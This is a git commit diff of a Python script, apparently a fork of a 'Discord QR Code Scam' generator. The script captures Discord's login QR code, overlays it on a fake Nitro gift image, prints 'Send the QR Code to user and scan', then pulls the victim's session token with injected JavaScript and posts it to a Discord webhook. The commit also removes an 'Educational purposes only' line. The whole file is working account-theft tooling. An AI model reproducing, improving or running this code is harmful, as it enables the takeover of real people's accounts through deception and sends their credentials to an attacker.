fdeef0773da2196c5d86015086ebc1975be4a911
GLUTEN <57950551+GlUTEN-BASH@users.noreply.github.com>
2021-06-17 16:39:44 +0300

    Update QR_Generator.py

--- QR_Generator.py
+++ QR_Generator.py
@@ -1,39 +1,31 @@
+import base64, time, os, requests, json
 from bs4 import BeautifulSoup
 from selenium import webdriver
 from PIL import Image
-import base64
-import time
-import os
-import requests
-import json
 
-# Developer: NightfallGT
-# Discord webhook and text dump functionality: KliqxTV
-# Educational purposes only
+WEBHOOK_URL = 'hook'
 
-WEBHOOK_URL = '<your webhook url>'
-
-def logo_qr():
-    im1 = Image.open('temp/qr_code.png', 'r')
-    im2 = Image.open('temp/overlay.png', 'r')
+def setlogo():
+    im = Image.open('dump.png', 'r')
+    im2 = Image.open('logo.png', 'r')
     im2_w, im2_h = im2.size
-    im1.paste(im2, (60, 55))
-    im1.save('temp/final_qr.png', quality=95)
+    im.paste(im2, (60, 55), mask=im2)
+    im.save('qr.png', quality=95)
 
-def paste_template():
-    im1 = Image.open('temp/template.png', 'r')
-    im2 = Image.open('temp/final_qr.png', 'r')
-    im1.paste(im2, (120, 409))
-    im1.save('discord_gift.png', quality=95)
+def paste():
+    im1 = Image.open('nitroscam.png', 'r')
+    im2 = Image.open('qr.png', 'r')
+    im1.paste(im2, (133, 351))
+    im1.save('gift.png', quality=95)
 
 def main():
     print('github.com/NightfallGT/Discord-QR-Scam\n')
     print('** QR Code Scam Generator **')
-
+    
     try:
-        os.remove("discord_gift.png")
+        os.remove("gift.png")
     except:
-        print("No previous discord_gift.png found.")
+        pass
 
     options = webdriver.ChromeOptions()
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
@@ -50,7 +42,7 @@ def main():
 
     div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
     qr_code = div.find('img')['src']
-    file = os.path.join(os.getcwd(), 'temp/qr_code.png')
+    file = os.path.join(os.getcwd(), 'dump.png')
 
     img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))
 
@@ -58,17 +50,16 @@ def main():
         handler.write(img_data)
 
     discord_login = driver.current_url
-    logo_qr()
-    paste_template()
+    setlogo()
+    paste()
 
-    print('- QR Code has been generated. > discord_gift.png')
+    print('- QR Code has been generated. > gift.png')
     print('Send the QR Code to user and scan. Waiting..')
     
     while True:
         if discord_login != driver.current_url:
             print('Grabbing token..')
             token = driver.execute_script('''
-
     var req = webpackJsonp.push([
         [], {
             extra_id: (e, t, r) => e.exports = r
@@ -101,7 +92,7 @@ def main():
 
             payload = json.dumps({
                 'content': message,
-                "username": "Retarded QR Code Scam"
+                "username": "QR Code Scam"
                 })
 
             req = requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)
